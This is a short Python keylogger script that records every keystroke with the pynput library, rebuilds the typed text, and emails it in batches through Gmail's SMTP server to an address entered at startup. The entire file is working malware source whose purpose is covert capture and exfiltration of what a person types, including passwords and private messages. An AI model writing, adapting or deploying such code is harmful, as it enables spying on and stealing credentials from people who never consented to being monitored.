import os
import smtplib
from pynput import mouse, keyboard

smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.ehlo()
smtpObj.starttls()

email = input('Enter your email: ')
password = input('Enter your password: ')
threshold = int(input('Enter threshold: '))

try:
    smtpObj.login(email, password)
except smtplib.SMTPAuthenticationError:
    print('enable less secure apps in your email.'.title())


def send_stoke_to_mail(msg):
    try:
        msg = 'Subject: Log Info\n' + msg
        smtpObj.sendmail('logger@log.com', email, msg)
    except Exception as e:
        print(e)


captured_strokes = ''
special_keys = {
    'Key.space': ' ',
    'Key.tab': '    ',
    'Key.enter': '\n'
}


CTRL_STATE = False

def on_press(key):
    global CTRL_STATE, captured_strokes, threshold
    string = ''
    if key == keyboard.Key.ctrl_l:
        CTRL_STATE = True
    try:
        string = key.char
    except AttributeError:
        key = str(key)
        if CTRL_STATE and key == 'Key.backspace':
            captured_strokes = ' '.join(captured_strokes.split(' ')[:-1])
        elif key == 'Key.backspace':
            captured_strokes = captured_strokes[:-1]
        else:
            string = special_keys.get(key, '')
    finally:
        captured_strokes += string
        if len(captured_strokes) > threshold:
            send_stoke_to_mail(captured_strokes)
            captured_strokes = ''


def on_release(key):
    global CTRL_STATE
    if key == keyboard.Key.esc:
        print(captured_strokes)
        smtpObj.quit()
        return False
    elif key == keyboard.Key.ctrl:
        CTRL_STATE = False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
